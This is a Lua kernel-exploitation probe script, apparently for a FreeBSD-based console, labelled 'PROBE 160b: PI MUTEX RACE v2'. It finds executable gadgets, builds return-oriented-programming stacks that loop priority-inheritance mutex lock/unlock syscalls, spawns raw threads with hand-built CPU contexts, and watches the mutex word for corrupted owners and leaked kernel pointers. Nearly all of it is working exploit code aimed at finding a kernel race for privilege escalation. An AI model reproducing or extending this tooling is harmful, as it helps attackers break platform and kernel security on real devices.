-- CRASH_CLASS: HIGH
-- PROBE 160b: Threaded PI mutex race — 2 children contend PI mutex
--
-- Fix from v1: ROP chain ended on LOCK → child slept holding mutex → deadlock.
-- Now: chain ends with UNLOCK before nanosleep. Main thread MONITORS only.
-- Children race at full kernel speed; main reads mutex word for anomalies.

print("=== PROBE 160b: PI MUTEX RACE v2 ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(num)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=num
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function hl(v)
    if type(v)=="table" and v.h then return v.h,v.l end
    return 0,N(v)
end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local umtx=mk(454)
local tc=mk(430)
local tk=mk(433)
local mm=mk(477)
local c624=mk(624)
local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local SA=syscall.syscall_address
if not SA then print("NO SA") return end

-- eboot gadgets
local inf=memory.alloc(0x200)
wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0
local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
print("gadgets OK")

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _CX=0x060;local _R8=0x068;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local STSZ=0x10000  -- 64KB

-- Preflight
print("")
local pre=memory.alloc(0x40);z(pre,0x40);wd(pre+4,4)
local ok_l,rv_l=pcall(function()
    return umtx(uint64(N(pre)),uint64(5),uint64(0),uint64(0),uint64(0))
end)
local mtid=rd(pre) or 0
print("PI ok ret="..(ok_l and tostring(N(rv_l)) or "X").." tid=0x"..string.format("%X",mtid))
if not ok_l or N(rv_l)~=0 then print("FAIL") return end
pcall(function() umtx(uint64(N(pre)),uint64(6),uint64(0),uint64(0),uint64(0)) end)

-- Build ROP stack: LOCK(5)→UNLOCK(6) loop, final UNLOCK before nanosleep
local function bstk(mx)
    local ok_s,stk=pcall(function()
        return mm(uint64(0),uint64(STSZ),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok_s then return nil,0 end

    -- Each pair=80B. Reserve 40B extra unlock + 56B nanosleep tail = 96B
    local np=math.floor((STSZ-96)/80)
    local off=0

    for i=1,np do
        -- UNLOCK(6)
        wq(stk+off,PRSI);off=off+8
        wq(stk+off,uint64(6));off=off+8
        wq(stk+off,PRAX);off=off+8
        wq(stk+off,uint64(454));off=off+8
        wq(stk+off,SA);off=off+8
        -- LOCK(5)
        wq(stk+off,PRSI);off=off+8
        wq(stk+off,uint64(5));off=off+8
        wq(stk+off,PRAX);off=off+8
        wq(stk+off,uint64(454));off=off+8
        wq(stk+off,SA);off=off+8
    end

    -- Extra UNLOCK so child releases mutex before sleeping
    wq(stk+off,PRSI);off=off+8
    wq(stk+off,uint64(6));off=off+8
    wq(stk+off,PRAX);off=off+8
    wq(stk+off,uint64(454));off=off+8
    wq(stk+off,SA);off=off+8

    -- nanosleep(999s) tail
    local ts=memory.alloc(16);wq(ts,uint64(999));wq(ts+8,uint64(0))
    wq(stk+off,PRDI);off=off+8
    wq(stk+off,uint64(N(ts)));off=off+8
    wq(stk+off,PRSI);off=off+8
    wq(stk+off,uint64(0));off=off+8
    wq(stk+off,PRAX);off=off+8
    wq(stk+off,uint64(240));off=off+8
    wq(stk+off,SA);off=off+8
    return stk,np
end

local function spwn(stk,mx,op)
    local ctx=memory.alloc(0x200);z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480));wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43));wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA);wq(ctx+_SP,uint64(N(stk)))
    wq(ctx+_AX,uint64(454))
    wq(ctx+_DI,uint64(N(mx)))
    wq(ctx+_SI,uint64(op))
    wq(ctx+_DX,uint64(0));wq(ctx+_CX,uint64(0));wq(ctx+_R8,uint64(0))
    local tb=memory.alloc(8);wq(tb,uint64(0))
    local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return ok_t,rv_t,rq(tb)
end

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end

local function nsl(ms)
    local ts=memory.alloc(16)
    wq(ts,uint64(math.floor(ms/1000)))
    wq(ts+8,uint64((ms%1000)*1000000))
    pcall(function() mk(240)(uint64(ts),uint64(0)) end)
end

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- ============================================================
print("")
print("--- PI RACE ---")
local mtx=memory.alloc(0x40);z(mtx,0x40);wd(mtx+4,4)

local vm0=vmc()
print("vm0="..vm0)

print("[1] stacks...")
local s1,p1=bstk(mtx)
if not s1 then print("s1 FAIL") return end
local s2,p2=bstk(mtx)
if not s2 then print("s2 FAIL") return end
print("  "..p1.." pairs each")

print("[2] child1...")
local ok1,rv1,tid1=spwn(s1,mtx,5)
print("  rv="..(ok1 and tostring(N(rv1)) or "X").." tid="..q(tid1))
nsl(5)

print("[3] child2...")
local ok2,rv2,tid2=spwn(s2,mtx,5)
print("  rv="..(ok2 and tostring(N(rv2)) or "X").." tid="..q(tid2))
nsl(10)

print("  alive="..tostring(alive(tid1)).."/"..tostring(alive(tid2)))

-- Main monitors mutex word while children race
print("[4] monitoring 200 samples...")
local t1v=N(tid1)
local t2v=N(tid2)
local anom=0

for i=1,200 do
    nsl(10)  -- 10ms between samples

    local own=rd(mtx) or 0
    local flg=rd(mtx+4) or 0

    -- Check for unexpected owners (not 0, not tid1, not tid2, not contested versions)
    local own_clean=own
    if own>=0x80000000 then own_clean=own-0x80000000 end
    local valid=(own_clean==0) or (own_clean==t1v) or (own_clean==t2v) or (own_clean==mtid)
    if not valid then
        anom=anom+1
        if anom<=10 then
            print(string.format("  *** ANOM #%d s%d: owner=0x%08X flags=0x%X",anom,i,own,flg))
        end
    end

    -- Scan for kernel pointers
    if i%50==0 then
        local kp=0
        for o=0,0x38,8 do
            local v=rq(mtx+o)
            if v then
                local vh=hl(v)
                if vh<0 then vh=vh+0x100000000 end
                if vh>=0xFFFF8000 and vh~=0xFFFFFFFF then
                    kp=kp+1
                    print(string.format("  KPTR +0x%02X: %s",o,q(v)))
                end
            end
        end
        local vm=vmc()
        print(string.format("  s%d o=0x%X f=0x%X vm=%d a=%s/%s kp=%d anom=%d",
            i,own,flg,vm,tostring(alive(tid1)),tostring(alive(tid2)),kp,anom))
    end
end

local vm1=vmc()
print("[5] vm: "..vm0.."->"..vm1.." d="..(vm1-vm0))
print("  anom="..anom)
print("[6] final:")
for o=0,0x20,4 do
    local v=rd(mtx+o) or 0
    if v~=0 or o<=4 then print(string.format("  +0x%02X: 0x%08X",o,v)) end
end
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 160b COMPLETE ===")
